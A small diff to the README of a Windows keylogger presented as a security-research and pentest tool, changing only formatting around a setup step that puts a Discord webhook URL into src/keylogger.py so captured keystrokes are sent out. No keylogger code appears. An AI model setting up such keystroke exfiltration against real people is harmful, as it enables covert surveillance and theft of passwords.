@@ -20,11 +20,13 @@ A Windows-focused keylogger implementation for legitimate security research, pen
 4. Copy the webhook URL
 
 ### Step 2: Replace Webhook in Code
-```python
+
 # In src/keylogger.py, replace this line:
+
 WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
 
 # With your actual webhook:
+
 WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
 
 ## 🚀 Quick Start (Windows)
